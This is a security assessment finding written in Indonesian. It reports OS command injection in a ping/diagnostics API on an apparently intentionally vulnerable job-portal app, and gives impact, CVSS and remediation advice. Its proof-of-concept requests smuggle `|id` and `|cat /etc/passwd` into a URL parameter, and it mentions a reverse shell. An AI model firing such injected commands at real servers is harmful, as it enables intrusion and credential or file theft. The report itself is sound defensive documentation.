# Finding 07: Command Injection

| Item | Detail |
|------|--------|
| **Kerentanan** | Command Injection (OS Command Injection) |
| **Severity** |  Critical |
| **Skor CVSS** | 9.8 (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`) |
| **Endpoint** | `GET /api/tools/ping?target=...` / `POST /api/system/diagnostics` |

---

## Deskripsi

Kerentanan ini terjadi karena aplikasi meneruskan input dari pengguna langsung ke dalam perintah sistem operasi (*system shell*) tanpa sanitasi atau escaping yang memadai. Kondisi ini memungkinkan penyerang menyisipkan karakter pemisah perintah (seperti `;`, `&&`, atau `|`) untuk mengeksekusi perintah arbitrer di sistem operasi server.

---

## Dampak

- **Eksekusi Perintah Jarak Jauh (Remote Code Execution):** Penyerang dapat menjalankan perintah sistem operasi secara bebas dengan tingkat hak akses yang dimiliki oleh aplikasi web.
- **Pengambilalihan Server Secara Penuh (Full Server Compromise):** Penyerang berpotensi mengambil kontrol total atas server, melakukan *privilege escalation*, atau mengunduh malware ke dalam sistem.
- **Pencurian dan Kerusakan Data (Data Breach & Destruction):** Penyerang dapat membaca file rahasia, mencuri kredensial, mengubah data sistem, atau menghapus seluruh direktori di dalam server.
- **Eskplorasi Jaringan Internal (Pivoting):** Server yang terkompromi dapat dijadikan pijakan oleh penyerang untuk memindai dan menyerang infrastruktur lain di dalam jaringan internal.

---

## Langkah Proof of Concept (PoC)

### Langkah 1 — Mengidentifikasi endpoint yang memproses perintah shell

Mengirimkan request pengujian normal ke fitur diagnostik/ping.

**Request:**

```http
GET /api/tools/ping?target=127.0.0.1 HTTP/1.1
Host: jobportal.vulnapp.id
```

>  **[Capture Request Diagnostics Ping Normal]**

---

### Langkah 2 — Menyisipkan karakter pemisah perintah (`|` atau `;`) dan perintah OS (`id`)

Menambahkan karakter pipe `|` atau semicolon `;` pada parameter input untuk mengeksekusi perintah tambahan di sistem operasi server.

**Request:**

```http
GET /api/tools/ping?target=127.0.0.1%7Cid HTTP/1.1
Host: jobportal.vulnapp.id
```

**Response (Output Perintah Tereksekusi):**

```text
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.032 ms

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

>  **[Capture Output Command Injection `id`]**

---

### Langkah 3 — Verifikasi dampak lanjutan dengan eksekusi perintah pembacaan file / reverse shell

Menjalankan perintah tambahan seperti `cat /etc/passwd` atau mengeksekusi reverse shell listener untuk membuktikan dampak Remote Code Execution (RCE) penuh.

**Request:**

```http
GET /api/tools/ping?target=127.0.0.1%7Ccat+/etc/passwd HTTP/1.1
Host: jobportal.vulnapp.id
```

>  **[Capture Response Command Execution `cat /etc/passwd`]**

---

## Rekomendasi Perbaikan

- **Hindari Memanggil Perintah Sistem Operasi Langsung:** Gunakan fungsi API bawaan bahasa pemrograman (*built-in API/library*) daripada menjalankan perintah shell eksternal untuk menyelesaikan suatu tugas.
- **Gunakan Parameterized API / Safe Functions:** Jika harus menjalankan fungsi eksternal, gunakan fungsi yang memisahkan perintah dan argumen secara tegas tanpa menggunakan shell (seperti `execFile` di Node.js atau list argumen pada `subprocess.run` di Python tanpa `shell=True`).
- **Sanitasi dan Validasi Input Ketat:** Terapkan validasi *allowlist* yang ketat (misalnya hanya mengizinkan karakter alfanumerik) dan gunakan fungsi *escaping* karakter shell resmi dari bahasa pemrograman jika input pengguna tidak bisa dihindari.
- **Terapkan Prinsip Least Privilege:** Jalankan aplikasi web menggunakan akun sistem dengan hak akses minimal sehingga dampak eksekusi perintah dapat dibatasi.